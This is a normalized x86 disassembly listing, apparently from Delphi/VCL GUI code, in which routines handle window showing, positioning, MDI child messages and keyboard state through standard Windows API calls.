cmp [ ebx + 0x150 ] 0x1
jne r-xdata
mov [ edx ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x154 ]
call sub_403fb0
mov [ edx ] 0x1
mov eax [ ebx + 0x158 ]
mov [ ecx ] eax
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_457560
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4576b1
push [ fs : eax ]
mov [ fs : eax ] esp
test [ esi + 0x1c ] 0x10
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4576b8
lea eax [ ebp - 0x10 ]
call sub_403f5c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov [ ebp - 0x9 ] 0x1
push ebp
mov eax [ esi + 0x248 ]
call sub_4574b4
pop ecx
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ eax + 0xc ]
call sub_438aac
mov ebx eax
jmp r-xdata
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_4124bc
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax esi
call sub_43b6e4
lea eax [ ebp - 0x1c ]
call sub_40688c
mov [ ebp - 0x14 ] eax
push ebp
mov eax [ esi + 0x7c ]
call sub_4574b4
pop ecx
mov [ ebp - 0x8 ] eax
test ebx ebx
je r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_4574f4
test al al
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_45bbc4
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov edx 0xd
mov eax [ rw-data ]
call sub_45bc2c
mov ecx [ ebp - 0x8 ]
mov edx 0x8
mov eax [ rw-data ]
call sub_45bc2c
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x9 ]
mov eax ebx
call sub_45752c
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_4124bc
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax ebx
call sub_43b6e4
lea eax [ ebp - 0x1c ]
call sub_40688c
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov ebx [ ebx + 0x30 ]
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_45bb5c
test [ esi + 0x228 ] 0x8
je r-xdata
sub_4576c0
push ebx
push esi
push ecx
mov [ esp ] edx
mov esi eax
test [ esi + 0x1c ] 0x2
jne r-xdata
mov edx [ esp ]
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edx
pop esi
pop ebx
retn
cmp [ esi + 0x22a ] 0x0
je r-xdata
mov edx [ esp ]
mov edx [ edx + 0x8 ]
mov eax [ esi + 0x74 ]
lea ecx [ edx + 0x18 ]
mov ebx [ eax + 0x14 ]
test ebx ebx
jbe r-xdata
mov ebx [ eax + 0x10 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea ecx [ edx + 0x20 ]
mov ebx [ eax + 0xc ]
test ebx ebx
jbe r-xdata
mov [ ecx + 0x4 ] ebx
mov ebx [ eax + 0x8 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea eax [ edx + 0x20 ]
push eax
lea eax [ edx + 0x24 ]
push eax
lea ecx [ edx + 0x1c ]
lea eax [ edx + 0x18 ]
mov edx eax
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov [ ecx + 0x4 ] ebx
sub_457734
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx ]
add eax ecx
sub eax esi
cdq
xor eax edx
sub eax edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x2e4 ]
jge r-xdata
pop esi
pop ebx
pop ebp
retn
sub esi ecx
mov [ ebx ] esi
sub_457760
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x2e2 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_440968
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov esi [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_455770
lea edx [ ebp - 0x14 ]
call sub_458f38
push ebp
mov eax [ ebp - 0x4 ]
call sub_455770
lea edx [ ebp - 0x24 ]
call sub_458f38
mov ecx [ ebp - 0x24 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0x14 ]
call sub_457734
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
call sub_455770
lea edx [ ebp - 0x24 ]
call sub_458f38
mov ecx [ ebp - 0x20 ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x10 ]
call sub_457734
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_457734
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4c ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x8 ]
call sub_457734
pop ecx
cmp [ eax + 0xc ] 0x0
je r-xdata
sub_457818
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
or [ ebx + 0x2f4 ] 0x20
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_403420
pop esi
pop ebx
retn
sub_45783c
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
and [ ebx + 0x2f4 ] 0xdf
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb1
call sub_403420
pop esi
pop ebx
retn
sub_457860
push ebx
push esi
mov esi edx
mov ebx eax
push 0x12
call GetKeyState
test ax ax
jl r-xdata
mov edx esi
mov eax ebx
call sub_441848
mov ax [ esi + 0x4 ]
sub ax 0x9
je r-xdata
push 0x11
call GetKeyState
test ax ax
jl r-xdata
add eax 0xffffffe4
sub ax 0x4
jb r-xdata
push 0x1
push 0x10
call GetKeyState
test ax ax
setge cl
mov edx [ ebx + 0x220 ]
mov eax ebx
call sub_442900
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
mov dx [ esi + 0x4 ]
cmp dx 0x27
je r-xdata
mov cl 0x1
cmp dx 0x28
je r-xdata
xor ecx ecx
jmp r-xdata
mov edx [ eax + 0x30 ]
xchg edx eax
call sub_442900
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_4578fc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_457e66
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
call sub_45c010
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x4
xor edx edx
push ebp
push sub_457e49
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457e50
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3f0
call sub_403998
xor eax eax
push ebp
push j_sub_4036ac#6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffaf
call sub_403420
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
push ebp
push j_sub_4036ac#7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_403420
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_456aa8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43f924
jmp r-xdata
mov eax [ rw-data ]
call sub_459194
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43b5d0
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_4423cc
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4423cc
push eax
call SetWindowPos
jmp r-xdata
mov eax [ rw-data ]
call sub_459188
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43b614
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4423cc
push eax
call IsIconic
test eax eax
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4423cc
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4423cc
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4423cc
call sub_452704
mov ebx eax
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4423cc
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_4591c4
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43b5d0
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_459194
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4423cc
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_4423cc
push eax
push DefMDIChildProcA
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_43be2c
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4423cc
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_4423cc
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_4591b8
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43b614
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_459188
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_455d58
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_455d58
jmp r-xdata
sub_4579b9
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_45b724
call sub_403a14
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ rw-data ]
call sub_459194
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43b5d0
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_459188
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43b614
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4423cc
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_4591c4
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43b5d0
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_459194
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457e50
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4423cc
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_4423cc
push eax
push DefMDIChildProcA
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_43be2c
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4423cc
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_4423cc
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_4591b8
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43b614
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_459188
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_455d58
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_455d58
jmp r-xdata
sub_457d55
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_45b724
call sub_403a14
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_456aa8
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43f924
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_4423cc
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4423cc
push eax
call SetWindowPos
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457e50
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4423cc
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4423cc
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4423cc
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4423cc
call sub_452704
mov ebx eax
sub_457e9c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
retn
mov eax [ rw-data ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
sub_457ef4
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
cmp [ esi + 0x59 ] 0x0
je r-xdata
pop esi
pop ecx
pop ebp
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c2f0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_457f52
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x68 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403224
retn
mov eax [ esi + 0x68 ]
mov edx [ edx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
sub_457f60
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
mov si 0xffab
call sub_403420
test al al
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_457f8c
push ebx
push esi
push ecx
mov ebx eax
test [ ebx + 0x2f4 ] 0x8
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov [ ebx + 0x24c ] 0x2
jmp r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov [ esp ] 0x1
test [ ebx + 0x228 ] 0x2
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov [ esp ] 0x3
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_45b710
jmp r-xdata
mov edx esp
mov eax ebx
mov si 0xffb0
call sub_403420
cmp [ esp ] 0x0
je r-xdata
cmp [ esp ] 0x3
jne r-xdata
mov eax ebx
call sub_45812c
jmp r-xdata
mov eax ebx
call sub_4581c8
mov dl 0x1
mov eax ebx
call sub_455d18
jmp r-xdata
sub_458030
push ebx
push esi
push edi
push ecx
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x29a ] 0x0
je r-xdata
mov [ esp ] 0x0
mov eax ebx
call sub_4556a4
mov esi eax
dec esi
test esi esi
jl r-xdata
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x29c ]
call [ ebx + 0x298 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax ebx
call sub_4556f0
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
sub_458094
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_4036ac#5
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
mov [ ebp - 0x5 ] 0x1
lea edx [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_403420
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4581c8
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45814c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4581ba
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22e ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4581c1
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3f0
call sub_403998
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_4569a4
sub_4581e4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4584ac
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_43a42c
mov eax [ ebp - 0x4 ]
